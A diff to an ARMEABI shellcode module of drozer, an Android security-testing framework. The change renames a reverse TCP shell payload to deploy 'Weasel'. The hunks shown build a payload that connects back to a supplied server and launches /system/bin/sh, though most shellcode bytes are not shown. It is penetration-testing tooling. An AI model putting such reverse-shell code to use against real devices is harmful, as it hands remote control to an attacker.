@@ -2,16 +2,16 @@ from drozer.modules import common, Module
 
 class ARMEABI(Module, common.ShellCode):
 
-    name = "Reverse TCP Shell (ARMEABI)"
+    name = "Reverse Weasel (ARMEABI)"
     description = """
-    Shell code to establish a simple reverse TCP shell.
+    Shell code to deploy Weasel, using a reverse TCP Shell.
     """
     examples = ""
     author = "Tyrone (@mwrlabs)"
     date = "2013-06-18"
     license = "BSD (3 clause)"
     module_type = "shellcode"
-    path = ["shell.reverse_tcp"]
+    path = ["weasel.reverse_tcp"]
     
     def generate(self, arguments):
         self.append([# Switch to THUMB mode for more compact shellcode
@@ -59,7 +59,7 @@ class ARMEABI(Module, common.ShellCode):
                      0x02, 0x00 ])
         self.append(self.hexifyInt32(int(arguments.server[1])))
         self.append(self.hexifyInetAddr(arguments.server[0]))
-        self.append(self.hexifyString("S"))     # 'S' to indicate shell
+        self.append(self.hexifyString("W"))     # 'W' to indicate weasel
         self.append(self.hexifyString("AA"))    # Padding
         self.append(self.hexifyString("/system/bin/sh"))
         self.append(self.hexifyNull())
